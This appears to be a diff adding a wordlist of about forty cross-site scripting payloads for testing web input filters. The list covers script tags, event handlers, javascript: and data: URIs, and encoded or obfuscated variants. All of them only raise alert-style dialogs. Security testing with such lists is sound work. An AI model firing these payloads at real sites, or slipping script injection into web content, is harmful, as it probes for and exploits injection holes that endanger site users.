@@ -1,0 +1,40 @@
+<script>alert("XSS")</script>
+<script>alert(1)</script>
+<script>confirm("XSS")</script>
+<script>prompt("XSS")</script>
+<img src=x onerror=alert("XSS")>
+<img src=x onload=alert("XSS")>
+<body onload=alert("XSS")>
+<input onfocus=alert("XSS") autofocus>
+<select onfocus=alert("XSS") autofocus>
+<textarea onfocus=alert("XSS") autofocus>
+<keygen onfocus=alert("XSS") autofocus>
+<video onloadstart=alert("XSS")><source>
+<audio onloadstart=alert("XSS")><source>
+javascript:alert("XSS")
+javascript:confirm("XSS")
+javascript:prompt("XSS")
+data:text/html,<script>alert("XSS")</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+<ScRiPt>alert("XSS")</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>
+<script>setTimeout("alert('XSS')",1)</script>
+<script>setInterval("alert('XSS')",1)</script>
+%3Cscript%3Ealert("XSS")%3C/script%3E
+&lt;script&gt;alert("XSS")&lt;/script&gt;
+&#60;script&#62;alert("XSS")&#60;/script&#62;
+&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;
+<style>body{background:url("javascript:alert('XSS')")}</style>
+<style>@import"javascript:alert('XSS')"</style>
+<style>body{-moz-binding:url("javascript:alert('XSS')")}</style>
+<svg onload=alert("XSS")>
+<svg><script>alert("XSS")</script></svg>
+<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>
+<iframe src="javascript:alert('XSS')"></iframe>
+<object data="javascript:alert('XSS')"></object>
+<embed src="javascript:alert('XSS')"></embed>
+<details open ontoggle=alert("XSS")>
+<marquee onstart=alert("XSS")>
+<meter onmouseenter=alert("XSS")>
+<progress onmouseenter=alert("XSS")>
